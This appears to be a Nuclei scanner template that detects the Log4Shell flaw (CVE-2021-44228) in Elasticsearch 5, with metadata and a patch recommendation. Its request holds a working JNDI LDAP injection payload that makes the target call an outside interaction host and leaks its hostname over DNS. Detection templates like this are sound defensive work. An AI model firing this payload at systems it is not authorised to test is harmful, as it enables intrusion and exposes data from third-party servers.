id: elasticsearch5-log4j-rce
info:
  name: Elasticsearch 5 - Remote Code Execution (Apache Log4j)
  author: akincibor
  severity: critical
  description: Elasticsearch 5 is vulnerable to remote code execution through Apache
    Log4j, allowing attackers to execute malicious code, access sensitive information,
    modify data, and gain full control of the system without authentication.
  reference:
  - https://www.horizon3.ai/the-long-tail-of-log4shell-exploitation/
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    shodan-query: elastic indices
    verified: 'true'
    impact: The elasticsearch5-log4j-rce vulnerability in Elasticsearch 5 allows for
      remote code execution and can result in severe impacts such as malware execution,
      data modification, and system takeover.
    recommendation: It is highly recommended that all Elasticsearch 5 users immediately
      update their system to patch the vulnerability of remote code execution via
      the Apache Log4j framework.
  tags: jndi,log4j,rce,oast,elasticsearch,cve,cve2021,kev
requests:
- raw:
  - 'GET /_search?a=$%7Bjndi%3Aldap%3A%2F%2F%24%7BhostName%7D.{{interactsh-url}}%7D
    HTTP/1.1

    Host: {{Hostname}}


    {

    '
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - org.elasticsearch.transport
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
  extractors:
  - type: kval
    kval:
    - interactsh_ip
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
